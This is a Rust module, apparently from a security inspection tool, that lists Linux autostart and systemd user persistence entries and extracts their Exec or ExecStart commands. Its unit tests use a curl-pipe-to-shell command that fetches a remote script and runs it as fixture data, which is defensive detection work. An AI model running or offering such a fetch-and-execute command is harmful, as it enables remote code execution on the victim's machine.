use std::fs;
use std::path::{Path, PathBuf};

use crate::collectors::persistence::PersistenceEntry;

pub fn collect_linux_persistence() -> Vec<PersistenceEntry> {
    if !cfg!(target_os = "linux") {
        return Vec::new();
    }

    let mut roots = Vec::new();
    if let Some(home) = std::env::var_os("HOME") {
        let home = PathBuf::from(home);
        roots.push(home.join(".config/autostart"));
        roots.push(home.join(".config/systemd/user"));
    }

    roots
        .iter()
        .flat_map(|root| collect_linux_entries(root))
        .collect()
}

fn collect_linux_entries(root: &Path) -> Vec<PersistenceEntry> {
    let Ok(read_dir) = fs::read_dir(root) else {
        return Vec::new();
    };

    read_dir
        .filter_map(|entry| entry.ok())
        .filter_map(|entry| {
            let path = entry.path();
            let text = fs::read_to_string(&path).ok()?;
            let command = extract_exec_line(&text)?;
            Some(PersistenceEntry {
                platform: "linux".to_string(),
                source: root.display().to_string(),
                name: entry.file_name().to_string_lossy().to_string(),
                command,
            })
        })
        .collect()
}

pub fn extract_exec_line(text: &str) -> Option<String> {
    text.lines()
        .find_map(|line| {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                return None;
            }

            let (key, value) = line.split_once('=')?;
            matches!(key.trim(), "Exec" | "ExecStart").then_some(value)
        })
        .map(str::trim)
        .map(str::to_string)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_desktop_exec_line() {
        let text = "[Desktop Entry]\nExec=/tmp/updater --silent\n";
        assert_eq!(
            extract_exec_line(text),
            Some("/tmp/updater --silent".to_string())
        );
    }

    #[test]
    fn extracts_systemd_execstart_with_whitespace_and_comments() {
        let text = "[Service]\n# ExecStart=/tmp/ignored\n  ExecStart = /bin/bash -lc 'curl https://example.test/p.sh | sh'\n";
        assert_eq!(
            extract_exec_line(text),
            Some("/bin/bash -lc 'curl https://example.test/p.sh | sh'".to_string())
        );
    }
}
